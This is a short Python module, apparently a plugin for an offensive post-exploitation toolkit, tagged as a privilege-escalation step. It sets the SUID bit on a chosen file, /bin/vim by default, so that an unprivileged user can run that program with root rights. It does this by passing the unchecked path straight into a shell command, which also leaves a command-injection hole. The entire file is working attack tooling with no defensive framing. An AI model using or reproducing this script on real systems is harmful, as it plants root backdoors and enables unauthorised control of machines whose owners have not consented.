#!/usr/bin/python3
#[PrivEsc] SUID add
#PATH,no,Set path to file
#END
import os

def main(arguments):
    if arguments[0] == "":
        arguments[0] = "/bin/vim"
    os.system("chmod +s " + arguments[0])
